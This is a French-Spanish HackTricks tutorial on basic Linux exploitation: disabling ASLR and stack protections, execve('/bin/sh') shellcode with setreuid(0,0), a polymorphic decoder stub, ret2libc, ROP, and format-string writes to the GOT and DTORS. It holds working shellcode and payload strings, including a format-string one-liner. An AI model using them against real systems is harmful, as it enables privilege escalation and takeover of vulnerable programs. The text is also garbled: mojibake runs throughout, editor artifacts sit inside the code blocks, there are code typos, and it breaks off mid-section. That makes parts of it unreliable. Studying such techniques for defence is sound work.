# Linux Exploiting (Basique) (SPA)

## Linux Exploiting (Basique) (SPA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**D√©sactiver l'aleatorisation (ASLR) GLOBALE (root)** :\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
R√©activer l'aleatorisation GLOBALE : echo 2 > /proc/sys/kernel/randomize\_va\_space

**D√©sactiver pour une ex√©cution** (ne n√©cessite pas de droits root) :\
setarch \`arch\` -R ./exemple arguments\
setarch \`uname -m\` -R ./exemple arguments

**D√©sactiver la protection de l'ex√©cution sur la pile**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemple.c -o exemple

**Fichier core**\
ulimit -c unlimited\
gdb /exec fichier_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texte**\
**Donn√©es**\
**BSS**\
**Heap**

**Pile**

**Section BSS** : Variables globales ou statiques non initialis√©es
```
static int i;
```
**Section DATA**: Variables globales ou statiques initialis√©es
```
int i = 5;
```
**Section TEXT**: Instructions du code (opcodes)

**Section HEAP**: Tampons allou√©s dynamiquement (malloc(), calloc(), realloc())

**Section STACK**: La pile (arguments pass√©s, cha√Ænes d'environnement (env), variables locales...)

## **1. D√âBORDEMENTS DE PILE**

> d√©bordement de tampon, d√©passement de tampon, d√©passement de pile, √©crasement de pile

Segmentation fault ou violation de segment: Lorsqu'on tente d'acc√©der √† une adresse m√©moire qui n'a pas √©t√© assign√©e au processus.

Pour obtenir l'adresse d'une fonction √† l'int√©rieur d'un programme, on peut faire :
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Appel √† sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** ‚Äî> Renvoie un fichier .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable compos√© du code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier qu'il s'agit bien de notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, un tour peut √™tre effectu√©. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons ins√©r√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ en utilisant le Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature sp√©cifique dans la shellcode). Utile dans les cas o√π l'on dispose d'un petit espace pour injecter du code.

**Shellcodes polymorphes**

Ce sont des shells chiffr√©es qui contiennent un petit code pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaquer le Frame Pointer (EBP)**

Utile dans une situation o√π nous pouvons modifier l'EBP mais pas l'EIP.

On sait qu'en sortant d'une fonction, le code assembleur suivant est ex√©cut√© :
```
movl               %ebp, %esp
popl                %ebp
ret
```
De cette mani√®re, il est possible de modifier l'EBP en sortant d'une fonction (fvuln) qui a √©t√© appel√©e par une autre fonction, lorsque la fonction appelant fvuln se termine, son EIP peut √™tre modifi√©.

Dans fvuln, on peut introduire un faux EBP pointant vers un emplacement o√π se trouve l'adresse de la shellcode + 4 (il faut ajouter 4 pour le pop). Ainsi, en sortant de la fonction, la valeur de &(\&Shellcode)+4 sera plac√©e dans ESP, avec le pop, 4 sera soustrait √† ESP et il pointera vers l'adresse de la shellcode lors de l'ex√©cution du ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Exploit Off-by-One**\
Il est possible de modifier uniquement le byte le moins significatif de l'EBP. Une attaque similaire √† celle d√©crite pr√©c√©demment peut √™tre r√©alis√©e, mais la m√©moire contenant l'adresse de la shellcode doit partager les 3 premiers octets avec l'EBP.

## **4. M√©thodes return to Libc**

M√©thode utile lorsque la pile n'est pas ex√©cutable ou laisse un tampon tr√®s petit √† modifier.

L'ASLR fait en sorte que, √† chaque ex√©cution, les fonctions soient charg√©es √† des emplacements diff√©rents en m√©moire. Par cons√©quent, cette m√©thode peut ne pas √™tre efficace dans ce cas. Pour les serveurs distants, comme le programme est constamment ex√©cut√© √† la m√™me adresse, cela peut √™tre utile.

* **cdecl (C declaration)** Place les arguments sur la pile et nettoie la pile apr√®s la sortie de la fonction
* **stdcall (standard call)** Place les arguments sur la pile et c'est la fonction appel√©e qui nettoie la pile
* **fastcall** Place les deux premiers arguments dans des registres et le reste sur la pile

On place l'adresse de l'instruction system de libc et on lui passe comme argument la cha√Æne "/bin/sh", g√©n√©ralement √† partir d'une variable d'environnement. De plus, on utilise l'adresse de la fonction exit pour que, une fois que la shell n'est plus n√©cessaire, le programme se termine sans probl√®me (et √©crit des journaux).

**export SHELL=/bin/sh**

Pour trouver les adresses dont nous aurons besoin, on peut regarder dans **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** ‚Äî> Donne l'adresse de toutes les fonctions utilis√©es par le programme lors de son chargement\
(Dans un start ou un breakpoint): **x/500s $esp** ‚Äî> On recherche ici la cha√Æne /bin/sh

Une fois que nous avons ces adresses, l'**exploit** serait le suivant :

‚ÄúA‚Äù \* DISTANCE EBP + 4 (EBP : peuvent √™tre 4 "A" bien que ce soit mieux si c'est le vrai EBP pour √©viter les erreurs de segmentation) + Adresse de **system** (√©crasera l'EIP) + Adresse de **exit** (√† la sortie de system(‚Äú/bin/sh‚Äù), cette fonction sera appel√©e car les 4 premiers octets de la pile sont trait√©s comme l'adresse suivante de l'EIP √† ex√©cuter) + Adresse de ‚Äú**/bin/sh**‚Äù (sera le param√®tre pass√© √† system)

Ainsi, l'EIP sera √©cras√© par l'adresse de system qui recevra la cha√Æne ‚Äú/bin/sh‚Äù comme param√®tre et √† la sortie de celle-ci, la fonction exit() sera ex√©cut√©e.

Il est possible qu'un byte de l'adresse d'une fonction soit nul ou un espace (\x20). Dans ce cas, on peut d√©sassembler les adresses pr√©c√©dant cette fonction car il y a probablement plusieurs NOPs qui nous permettront d'appeler l'un d'eux au lieu de la fonction directement (par exemple avec > x/8i system-4).

Cette m√©thode fonctionne car en appelant une fonction comme system en utilisant l'opcode **ret** au lieu de **call**, la fonction comprend que les 4 premiers octets seront l'adresse **EIP** vers laquelle revenir.

Une technique int√©ressante avec cette m√©thode est d'appeler **strncpy()** pour d√©placer une charge utile de la pile au tas, puis d'utiliser **gets()** pour ex√©cuter cette charge utile.

Une autre technique int√©ressante est l'utilisation de **mprotect()** qui permet d'attribuer les autorisations souhait√©es √† n'importe quelle partie de la m√©moire. Cela fonctionnait sur BDS, MacOS et OpenBSD, mais pas sur Linux (qui emp√™che l'attribution simultan√©e de permissions d'√©criture et d'ex√©cution). Avec cette attaque, il serait possible de reconfigurer la pile comme ex√©cutable.

**Encha√Ænement de fonctions**

Bas√© sur la technique pr√©c√©dente, cette forme d'exploit consiste en :\
Remplissage + \&Fonction1 + \&pop;ret; + \&arg\_fun1 + \&Fonction2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Ainsi, il est possible d'encha√Æner les fonctions √† appeler. De plus, si l'on souhaite utiliser des fonctions avec plusieurs arguments, on peut placer les arguments n√©cessaires (par exemple 4) et mettre les 4 arguments et rechercher une adresse avec des opcodes : pop, pop, pop, pop, ret ‚Äî> **objdump -d executable**

**Encha√Ænement en falsifiant les trames (encha√Ænement des EBPs)**

Il s'agit de profiter de la capacit√© de manipuler l'EBP pour encha√Æner l'ex√©cution de plusieurs fonctions √† travers l'EBP et de "leave;ret"

REMPLISSAGE

* Placer dans l'EBP un faux EBP pointant vers : 2√®me faux EBP + la fonction √† ex√©cuter : (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* Dans l'EIP, mettre comme adresse une fonction &(leave;ret)

On commence la shellcode avec l'adresse de la partie suivante de la shellcode, par exemple : 2√®me EBP faux + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

le 2√®me EBP serait : 3√®me faux EBP + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Cette shellcode peut √™tre r√©p√©t√©e ind√©finiment dans les parties de la m√©moire auxquelles on a acc√®s, de sorte qu'une shellcode facilement divisible en petits morceaux de m√©moire sera obtenue.

(L'ex√©cution de fonctions est encha√Æn√©e en m√©langeant les vuln√©rabilit√©s pr√©c√©demment vues d'EBP et de ret2lib)

## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utile lorsque l'on ne peut pas placer une adresse de la pile dans l'EIP (on v√©rifie que l'EIP ne contient pas 0xbf) ou lorsque l'on ne peut pas calculer l'emplacement de la shellcode. Cependant, la fonction vuln√©rable accepte un param√®tre (la shellcode ira ici).

Ainsi, en changeant l'EIP par une adresse de **ret**, la prochaine adresse sera charg√©e (qui est l'adresse du premier argument de la fonction). Autrement dit, la shellcode sera charg√©e.

L'exploit serait : SHELLCODE + Remplissage (jusqu'√† l'EIP) + **\&ret** (les octets suivants de la pile pointent vers le d√©but de la shellcode car l'adresse du param√®tre pass√© est plac√©e dans la pile)

Apparemment, des fonctions comme **strncpy** une fois termin√©es suppriment de la pile l'adresse o√π la shellcode √©tait stock√©e, rendant cette technique impossible. Autrement dit, l'adresse pass√©e √† la fonction en tant qu'argument (celle qui stocke la shellcode) est modifi√©e par un 0x00, donc lors du deuxi√®me **ret**, un 0x00 est rencontr√© et le programme se termine.
```
**Ret2PopRet**
```
Si nous n'avons pas le contr√¥le sur le premier argument mais sur le deuxi√®me ou le troisi√®me, nous pouvons √©craser EIP avec une adresse de pop-ret ou pop-pop-ret, selon ce dont nous avons besoin.

**Technique de Murat**

Dans Linux, tous les programmes sont mapp√©s √† partir de 0xbfffffff.

En examinant comment la pile d'un nouveau processus est construite dans Linux, il est possible de d√©velopper un exploit de sorte que le programme soit lanc√© dans un environnement o√π la seule variable est la shellcode. L'adresse de celle-ci peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_executable\_complet) - strlen(shellcode)

Cela permettrait d'obtenir facilement l'adresse o√π se trouve la variable d'environnement avec la shellcode.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement n'ayant que les variables d'environnement souhait√©es.

**Jump to ESP: Style Windows**

Comme ESP pointe toujours au d√©but de la pile, cette technique consiste √† remplacer EIP par l'adresse d'un appel √† **jmp esp** ou **call esp**. Ainsi, la shellcode est sauvegard√©e apr√®s l'√©crasement de l'EIP car apr√®s l'ex√©cution du **ret**, ESP pointera vers l'adresse suivante, l√† o√π la shellcode a √©t√© sauvegard√©e.

Si l'ASLR n'est pas activ√© sur Windows ou Linux, il est possible d'appeler **jmp esp** ou **call esp** stock√©s dans un objet partag√©. Si l'ASLR est activ√©, il pourrait √™tre n√©cessaire de rechercher √† l'int√©rieur du programme vuln√©rable lui-m√™me.

De plus, le fait de pouvoir placer la shellcode apr√®s la corruption de l'EIP au lieu de au milieu de la pile permet d'√©viter que les instructions push ou pop ex√©cut√©es au milieu de la fonction n'interf√®rent avec la shellcode (ce qui pourrait se produire si elle √©tait plac√©e au milieu de la pile de la fonction).

De mani√®re similaire, si l'on sait qu'une fonction renvoie l'adresse o√π la shellcode est stock√©e, on peut appeler **call eax** ou **jmp eax (ret2eax).**

**ROP (Programmation Orient√©e Retour) ou fragments de code emprunt√©s**

Les morceaux de code invoqu√©s sont appel√©s gadgets.

Cette technique consiste √† encha√Æner diff√©rents appels de fonctions en utilisant la technique **ret2libc** et l'utilisation de **pop,ret**.

Dans certaines architectures de processeurs, chaque instruction est un ensemble de 32 bits (comme le MIPS par exemple). Cependant, chez Intel, les instructions sont de taille variable et plusieurs instructions peuvent partager un ensemble de bits, par exemple :

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contient les octets 0xffe4 qui peuvent √©galement √™tre traduits par : **jmp \*%esp**

De cette mani√®re, il est possible d'ex√©cuter certaines instructions qui ne sont m√™me pas pr√©sentes dans le programme original.

**ROPgadget.py** nous aide √† trouver des valeurs dans les binaires.

Ce programme sert √©galement √† cr√©er les **payloads**. Vous pouvez lui fournir la biblioth√®que √† partir de laquelle vous souhaitez extraire les ROPs et il g√©n√©rera un payload en Python auquel vous fournissez l'adresse de cette biblioth√®que, et le payload est pr√™t √† √™tre utilis√© comme shellcode. De plus, comme il utilise des appels syst√®me, il ne fait pas r√©ellement s'ex√©cuter quoi que ce soit sur la pile, mais il enregistre simplement les adresses des ROPs qui seront ex√©cut√©es via **ret**. Pour utiliser ce payload, il faut appeler le payload via une instruction **ret**.

**D√©bordements d'entiers**

Ce type de d√©bordements se produit lorsque une variable n'est pas pr√™te √† g√©rer un nombre aussi grand que celui qui lui est pass√©, peut-√™tre en raison d'une confusion entre les variables sign√©es et non sign√©es, par exemple :
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le deuxi√®me est la cha√Æne.

Si nous passons un nombre n√©gatif comme premier param√®tre, il affichera que len < 256 et nous passerons ce filtre, de plus strlen(buffer) sera inf√©rieur √† l, car l est un unsigned int et sera tr√®s grand.

Ce type de d√©bordements ne vise pas √† √©crire quelque chose dans le processus du programme, mais √† contourner des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne sait pas quelle valeur peut prendre une variable non initialis√©e et il pourrait √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur qu'une variable de la fonction pr√©c√©dente prenait et celle-ci soit contr√¥l√©e par l'attaquant.

## **Cha√Ænes de format**

En C, **`printf`** est une fonction qui peut √™tre utilis√©e pour **afficher** une cha√Æne. Le **premier param√®tre** que cette fonction attend est le **texte brut avec les formateurs**. Les **param√®tres suivants** attendus sont les **valeurs** √† **substituer** aux **formateurs** du texte brut.

La vuln√©rabilit√© appara√Æt lorsqu'un **texte d'attaquant est mis en tant que premier argument** de cette fonction. L'attaquant pourra cr√©er une **entr√©e sp√©ciale en abusant** des capacit√©s de **cha√Æne de format printf** pour **√©crire n'importe quelle donn√©e √† n'importe quelle adresse**. De cette mani√®re, il peut **ex√©cuter du code arbitraire**.

Formateurs:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **√©crit** le **nombre d'octets √©crits** √† l'**adresse indiqu√©e. √âcrire** autant **d'octets** que le nombre hexad√©cimal que nous **devons √©crire** est comment vous pouvez **√©crire n'importe quelle donn√©e**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

C'est la table qui contient l'**adresse** des **fonctions externes** utilis√©es par le programme.

Obtenez l'adresse de cette table avec : **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observez comment apr√®s le **chargement** de l'**ex√©cutable** dans GEF, vous pouvez **voir** les **fonctions** qui sont dans le **GOT** : `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

En utilisant GEF, vous pouvez **d√©marrer** une **session de d√©bogage** et ex√©cuter **`got`** pour voir la table got :

![](<../../.gitbook/assets/image (621).png>)

Dans un binaire, le GOT contient les **adresses des fonctions ou** de la section **PLT** qui chargera l'adresse de la fonction. L'objectif de cette exploitation est de **remplacer l'entr√©e GOT** d'une fonction qui sera ex√©cut√©e plus tard **avec** l'**adresse** du PLT de la fonction **`system`**. Id√©alement, vous **remplacerez** le **GOT** d'une **fonction** qui **sera appel√©e avec des param√®tres contr√¥l√©s par vous** (vous pourrez donc contr√¥ler les param√®tres envoy√©s √† la fonction syst√®me).

Si **`system`** **n'est pas utilis√©** par le script, la fonction system **n'aura pas d'entr√©e** dans le GOT. Dans ce sc√©nario, vous devrez **d'abord divulguer l'adresse** de la fonction `system`.

La **Procedure Linkage Table** est une table **en lecture seule** dans le fichier ELF qui stocke tous les **symboles n√©cessitant une r√©solution**. Lorsqu'une de ces fonctions est appel√©e, le **GOT** **redirigera** le **flux** vers le **PLT** pour qu'il puisse **r√©soudre** l'**adresse** de la fonction et l'√©crire dans le GOT. Ensuite, la **prochaine fois** qu'un appel est effectu√© √† cette adresse, la **fonction** est **appel√©e directement** sans avoir besoin de la r√©soudre.

Vous pouvez voir les adresses PLT avec **`objdump -j .plt -d ./vuln_binary`**

### **Flux d'Exploitation**

Comme expliqu√© pr√©c√©demment, l'objectif sera de **remplacer** l'**adresse** d'une **fonction** dans la table **GOT** qui sera appel√©e plus tard. Id√©alement, nous pourrions d√©finir l'**adresse d'un shellcode** situ√© dans une section ex√©cutable, mais il est tr√®s probable que vous ne puissiez pas √©crire de shellcode dans une section ex√©cutable.\
Une option diff√©rente est donc de **remplacer** une **fonction** qui **re√ßoit** ses **arguments** de l'**utilisateur** et de la **pointer** vers la fonction **`system`**.

Pour √©crire l'adresse, g√©n√©ralement 2 √©tapes sont effectu√©es : Vous **√©crivez d'abord 2 octets** de l'adresse, puis les 2 autres. Pour ce faire, on utilise **`$hn`**.

**HOB** est appel√© pour les 2 octets les plus √©lev√©s de l'adresse\
**LOB** est appel√© pour les 2 octets les plus bas de l'adresse

Ainsi, en raison du fonctionnement de la cha√Æne de format, vous devez **√©crire d'abord le plus petit** des \[HOB, LOB] puis l'autre.

Si HOB < LOB\
`[adresse+2][adresse]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[adresse+2][adresse]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Mod√®le d'Exploitation de Cha√Æne de Format**

Vous pouvez trouver un **mod√®le** pour exploiter le GOT en utilisant des cha√Ænes de format ici :

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentiellement, il s'agit d'une structure avec des **fonctions qui seront appel√©es** avant que le programme ne se termine. C'est int√©ressant si vous pouvez appeler votre **shellcode en sautant √† une adresse**, ou dans les cas o√π vous devez revenir √† main pour **exploiter la cha√Æne de format une deuxi√®me fois**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela **ne** **cr√©era pas** de **boucle infinie** car lorsque vous revenez √† la fonction principale, le canari le remarquera, la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e. Ainsi, avec cela, vous pourrez **avoir 1 ex√©cution suppl√©mentaire** de la vuln√©rabilit√©.

### **Formatage des cha√Ænes pour extraire du contenu**

Une cha√Æne de format peut √©galement √™tre exploit√©e pour **extraire du contenu** de la m√©moire du programme.\
Par exemple, dans la situation suivante, il y a une **variable locale dans la pile pointant vers un drapeau**. Si vous **trouvez** o√π en **m√©moire** se trouve le **pointeur** vers le **drapeau**, vous pouvez faire en sorte que **printf acc√®de** √† cette **adresse** et **affiche** le **drapeau** :

Ainsi, le drapeau est √† **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le **pointeur vers le drapeau** est dans le **8e** param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Donc, en **acc√©dant** au **8e param√®tre**, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'en suivant l'**exploit pr√©c√©dent** et en r√©alisant que vous pouvez **extraire du contenu**, vous pouvez **d√©finir des pointeurs** vers **`printf`** dans la section o√π l'**ex√©cutable** est **charg√©** et le **dumper** **enti√®rement** !

### **DTOR**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare de trouver un binaire avec une section dtor**.
{% endhint %}

Les destructeurs sont des fonctions qui sont **ex√©cut√©es avant la fin du programme**.\
Si vous parvenez √† **√©crire** une **adresse** vers un **shellcode** dans **`__DTOR_END__`**, cela sera **ex√©cut√©** avant la fin des programmes.\
Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
D'habitude, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc, si vous voyez juste ces valeurs, cela signifie qu'**aucune fonction n'est enregistr√©e**. Donc, **√©crasez** le **`00000000`** avec l'**adresse** du **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de format pour les d√©bordements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e **vers** une **variable**. Par cons√©quent, vous pourriez abuser de la **mise en forme** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira **44B+"AAAA" dans la variable**, ce qui peut provoquer un d√©bordement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es en param√®tres.** Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** du **main**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour pointer par exemple vers un shellcode, vous **prendrez le contr√¥le** du **processus**, mais c'est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse vers laquelle elles pointent n'est pas l'adresse des fonctions, mais est **crypt√©e avec XOR** et des d√©calages avec une **cl√© al√©atoire**. Ainsi, actuellement, ce vecteur d'attaque n'est **pas tr√®s utile au moins sur x86** et **x64\_86**.\
La **fonction de cryptage** est **`PTR_MANGLE`**. D'autres architectures telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de cryptage** car elle **renvoie la m√™me chose** qu'elle a re√ßue en entr√©e. Ainsi, ces architectures pourraient √™tre attaqu√©es par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc s'il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **surchage** du **VPtr** est r√©alis√©e, elle pourrait √™tre **modifi√©e** pour **pointer** vers une m√©thode factice de sorte que l'ex√©cution d'une fonction aille vers le shellcode.

## **Mesures pr√©ventives et √©vasions**

**ASLR pas si al√©atoire**

PaX divise l'espace d'adressage du processus en 3 groupes :

Code et donn√©es initialis√©es et non initialis√©es : .text, .data et .bss ‚Äî> 16 bits d'entropie dans la variable delta\_exec, cette variable est initialis√©e de mani√®re al√©atoire √† chaque processus et est ajout√©e aux adresses initiales

M√©moire allou√©e par mmap() et biblioth√®ques partag√©es ‚Äî> 16 bits, delta\_mmap

